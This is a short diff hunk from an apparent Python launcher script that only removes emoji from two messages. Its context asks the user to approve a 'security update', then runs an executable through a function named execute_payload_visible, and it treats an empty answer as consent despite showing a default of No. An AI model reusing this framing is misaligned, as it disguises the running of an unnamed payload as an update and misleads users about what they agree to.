@@ -61,13 +61,13 @@ def main():
     # User confirmation
     confirm = input("\n  Execute security update? (y/N): ").lower().strip()
     if confirm not in ['y', 'yes', '']:
-        print("❌ Update cancelled by user.")
+        print(" Update cancelled by user.")
         sys.exit(0)
     
     # Execute visibly
     execute_payload_visible(exe_path)
     
-    print("\n🎉 Security update completed!")
+    print("\n Security update completed!")
     print("Monitor any new windows/processes for results.")
     
     input("\nPress Enter to exit...")
